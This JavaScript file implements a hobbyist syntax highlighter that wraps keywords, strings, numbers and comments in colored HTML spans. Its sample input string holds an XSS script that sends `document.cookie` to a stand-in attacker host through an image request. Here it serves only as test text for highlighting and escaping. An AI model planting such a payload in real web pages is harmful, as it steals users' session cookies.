// Syntax Highlighter by Hackerry

// Bug 1: 30*20 not highlighting digits
// Bug 2: -100 is treated as pointer
// Bug 3: / is treated as comment deliminator
// Bug 4: </ causes infinite loop (same reason as 3)
// ^ Addressed

var data = String.raw`<script>
    var fakeImage = document.createElement("img");
    fakeImage.src = "attacker_owned_website.com/image.png?cookie=" + document.cookie;
    document.appendChild(fakeImage);
</script>`;

const KEYWORDS = [
    // Java keywords: https://docs.oracle.com/javase/tutorial/java/nutsandbolts/_keywords.html
    "abstract", "continue", "for", "new", "switch", "assert", "default", "goto", "package", "synchronized", "boolean", "do", "if", "private", "this", "break", "double", "implements", "protected", "throw", "byte", "else", "import", "public", "throws", "case", "enum", "instanceof", "return", "transient", "catch", "extends", "int", "short", "try", "char", "final", "interface", "static", "void", "class", "finally", "long", "strictfp","volatile", "const", "float", "native", "super", "while",
    // + GOlang keywords: https://golang.org/ref/spec#Keywords
    "func", "var", "select", "defer", "go", "map", "struct", "chan", "fallthrough", "range", "type",
    // + Javascript keywords: https://www.w3schools.com/js/js_reserved.asp
    "arguments", "await", "debugger", "delete", "eval", "export", "false", "function", "in", "let", "null", "true", "typeof", "with", "yield",
    // + C keywords: https://en.cppreference.com/w/c/keyword
    "auto", "extern", "inline", "register", "restrict", "signed", "sizeof", "typedef", "union", "unsigned",
    // + C++ keywords: https://en.cppreference.com/w/cpp/keyword
    "alignas", "alignof", "and", "and_eq", "asm", "atomic_cancel", "atomic_commit", "atomic_noexcept", "bitand", "bitor", "bool", "char8_t", "char16_t", "char32_t", "compl", "concept", "consteval", "constexpr", "constinit", "const_cast", "co_await", "co_return", "co_yield", "decltype", "dynamic_cast", "explicit", "friend", "mutable", "namespace", "noexcept", "not", "not_eq", "nullptr", "operator", "or", "or_eq", "reflexpr", "reinterpret_cast", "requires", "short", "static_assert", "static_cast", "template", "thread_local", "typeid", "typename", "using", "virtual", "wchar_t", "xor", "xor_eq",
];

const REG_DELIM = ["(", ")", ";", ":", "=", "<", ">", "+", "{", "}", "[", "]", "&", "|", "^", "%", " ", "\n", ",", "*"];
const STR_DELIM = ["'", "\""];
const ESC_DELIM = ["\\"];
const COM_DELIM = ["/"];
const FUN_DELIM = ["."];
const PTR_DELIM = ["-"];

const REG_COLOR = '#000000';
const STR_COLOR = '#d8721a';
const ESC_COLOR = '#ffeb3b';
const NUM_COLOR = '#4caf50';
const COM_COLOR = '#9e9e9e';
const KEY_COLOR = '#2196f3';
const FUN_COLOR = '#ffeb3b';
const PTR_COLOR = '#DAF7A6 ';

// Highlight code
// UsedForBlog is a parameter I use to furthur style the code to be used directly in my blog
function highlight(data, usedForBlog=false) {
    var startIdx = 0;

    var result = '';
    if(usedForBlog) {
        result = '<ul class=\'ccode\'>\n<li><pre>';
    }

    // Print individual characters for debug
    // data.split('').forEach((e, i) => console.log(i + ": " + data.charCodeAt(i) + "-" + e + "\n"));

    var i = 0;
    var dataLength = data.length;
    while(i < dataLength) {
        if(data.charAt(i) === '/') {
            //console.log("Comment starts at: " + i);

            // Test comment
            var isComment = false;
            var isMultiline = false;
            if(data.charAt(i+1) === '/') {
                // Single line comment
                isComment = true;
            } else if(data.charAt(i+1) === '*') {
                // Multi-line comment
                isComment = true;
                isMultiline = true;
            }

            // Loop until comment ends
            if(isComment) {
                startIdx = i;

                while(i < dataLength) {
                    i++;

                    // Comment end detection
                    if(data.charAt(i) === '\n' && !isMultiline) {
                        break;
                    } else if(data.charAt(i) === '*' && i+1 < dataLength && data.charAt(i+1) === '/' && isMultiline) {
                        i++;
                        break;
                    }
                }

                // Hightlight last part
                result += getHightLight(escapeSpecialChar(data.substring(startIdx, i+1)), COM_COLOR, usedForBlog);
                //console.log("Comment highlighted: " + startIdx + "-" + i);
            } else {
                // Normal slash, do nothing and record it
                result += data.charAt(i);
            }
            //console.log("Comment ends at: " + i);
        } else if(STR_DELIM.includes(data.charAt(i))) {
            //console.log("String starts at: " + i);

            // Test string
            var strDelim = data.charAt(i);
            startIdx = i;

            // Loop until string ends
            while(i < dataLength) {
                i++;

                // String end detection
                //console.log("Char is " + data.charAt(i) + " at: " + i);
                if(data.charAt(i) === strDelim) {
                    break;
                } else if(ESC_DELIM.includes(data.charAt(i)) && i+1 < dataLength) {
                    // Optional escape sequence
                    result += getHightLight(escapeSpecialChar(data.substring(startIdx, i)), STR_COLOR, usedForBlog);
                    result += getHightLight(escapeSpecialChar(data.substring(i, i+2)), ESC_COLOR, usedForBlog);
                    i++;
                    startIdx = i+1;
                }
            }

            // Hightlight last part
            result += getHightLight(escapeSpecialChar(data.substring(startIdx, i+1)), STR_COLOR, usedForBlog);
            //console.log("String ends: " + startIdx + "-" + i);
        } else if(FUN_DELIM.includes(data.charAt(i))) {
            //console.log("Function call check starts at: " + i);

            result += getRegular(escapeSpecialChar(data.charAt(i)), usedForBlog);
            i++;

            startIdx = i;

            // Only detect function name with alphanumeric chars and underscores
            while(i < dataLength && data.charAt(i).match(/[a-z0-9_]/i)) {
                i++;
            }

            // Function open bracket
            if(data.charAt(i) === '(') {
                result += getHightLight(escapeSpecialChar(data.substring(startIdx, i)), FUN_COLOR, usedForBlog);
                result += getRegular(escapeSpecialChar(data.charAt(i)), usedForBlog);
            } else {
                // Other default color
                result += getRegular(escapeSpecialChar(data.substring(startIdx, i)), usedForBlog);

                // Move one character to the left in case data[i] is a special deliminator
                i--;
            }

            //console.log("Function check ends: " + startIdx + "-" + i);
        } else if(PTR_DELIM.includes(data.charAt(i))) {
            //console.log("Pointer call check starts at: " + i);

            if(i+1 < dataLength && data.charAt(i+1) === '>') {
                result += getRegular(escapeSpecialChar(data.substring(i, i+2)), usedForBlog);
                i += 2;

                startIdx = i;

                // Only detect pointer field with alphanumeric chars and underscores
                while(i < dataLength && data.charAt(i).match(/[a-z0-9_]/i)) {
                    i++;
                }

                result += getHightLight(escapeSpecialChar(data.substring(startIdx, i)), PTR_COLOR, usedForBlog);
                i--;
            } else {
                // Normal minus sign, do nothing and record it
                result += data.charAt(i);
            }

            //console.log("Pointer check ends: " + startIdx + "-" + i);
        } else {
            //console.log("Other checks start at: " + i);

            // Everything else
            startIdx = i;

            // Loop until next deliminator
            var specialDelim = false;
            while(!REG_DELIM.includes(data.charAt(i)) && i < dataLength) {
                if(STR_DELIM.includes(data.charAt(i)) || COM_DELIM.includes(data.charAt(i)) || FUN_DELIM.includes(data.charAt(i)) || PTR_DELIM.includes(data.charAt(i))) {
                    specialDelim = true;
                    break;
                }

                i++;
            }

            // Check keywords and digits, or special deliminator processed in previous cases
            var lastString = data.substring(startIdx, i);
            if(KEYWORDS.includes(lastString)) {
                // Is a keyword
                result += getHightLight(escapeSpecialChar(lastString), KEY_COLOR, usedForBlog);
                result += getRegular(escapeSpecialChar(data.charAt(i)), usedForBlog);
            } else if(lastString !== '' && lastString.split('').every((c) => c >= '0' && c <= '9')) {
                // Is a number
                result += getHightLight(escapeSpecialChar(lastString), NUM_COLOR, usedForBlog);
                result += getRegular(escapeSpecialChar(data.charAt(i)), usedForBlog);
            } else if(lastString.match(/[a-z0-9_]/i) && data.charAt(i) === '(') {
                // Is a function
                result += getHightLight(escapeSpecialChar(lastString), FUN_COLOR, usedForBlog);
                result += getRegular(escapeSpecialChar(data.charAt(i)), usedForBlog);
            }else {
                // Special deliminator in prev cases
                if(specialDelim) {
                    result += getRegular(escapeSpecialChar(data.substring(startIdx, i)), usedForBlog);
                    i--;
                } else {
                    result += getRegular(escapeSpecialChar(data.substring(startIdx, i+1)), usedForBlog);
                }
            }

            //console.log("Other checks end at: " + i);
        }

        startIdx = i;
        i++;
    }

    if(usedForBlog) {
        result += "</pre></li>\n</ul>";
    }

    return result;
}

// Regular text
function getRegular(part, usedForBlog=false) {
    if(usedForBlog) {
        return part.replaceAll("\n", "</pre></li>\n<li><pre>");
    } else {
        return part.replaceAll("\n", "<br>");
    }
}

// Get highlighted html code
function getHightLight(part, color, usedForBlog=false) {
    if(usedForBlog) {
        var part = "<span style='color:" + color + "'>" + part + "</span>";
        return part.replaceAll("\n", "</span></pre></li>\n<li><pre><span style='color:" + color + "'>");
    } else {
        var part = "<span style='color:" + color + "'>" + part + "</span>";
        return part.replaceAll("\n", "<br>");
    }
}

// Escape special characters
function escapeSpecialChar(data) {
    data = String(data);
    data = data.replaceAll('&','&amp;');
    data = data.replaceAll('<','&lt;');
    data = data.replaceAll('>','&gt;');

    return data;
}